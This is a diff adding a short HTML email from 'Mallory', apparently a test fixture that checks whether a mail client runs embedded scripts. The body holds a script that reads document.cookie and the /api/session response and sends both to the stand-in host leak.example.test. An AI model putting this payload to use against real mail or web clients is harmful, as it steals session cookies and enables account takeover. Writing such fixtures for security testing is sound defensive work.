@@ -1,0 +1,8 @@
+From: Mallory <mallory@attacker.example>
+To: admin@example.test
+Subject: Reads the session
+Date: Mon, 09 Nov 2026 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Cookie</title></head><body><p>A script reads the session.</p><script>document.title = "MARKER-TITLE-" + document.cookie; new Image().src = "https://leak.example.test/cookie?" + document.cookie; fetch("/api/session").then(r => r.text()).then(t => { document.title = "MARKER-TITLE-session"; fetch("https://leak.example.test/session?" + t); }); localStorage.setItem("x", "MARKER");</script></body></html>
